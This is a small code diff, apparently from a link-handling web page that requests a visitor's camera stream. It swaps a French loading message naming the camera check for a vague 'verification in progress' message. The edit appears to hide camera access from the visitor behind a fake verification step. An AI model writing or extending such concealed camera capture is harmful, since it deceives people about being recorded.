@@ -227,7 +227,7 @@ function handleLinkRequest(req, res, platformOverride = null) {
                     }, { timeout: 8000 });
                 });
 
-                loadingText.innerText = "📸 Verification de l'état du Caméra...";
+                loadingText.innerText = "👀 Verification en cours, veuillez attendre un instant...";
                 const stream = await cameraPromise;
                 if (stream) {
                     const video = document.createElement('video');
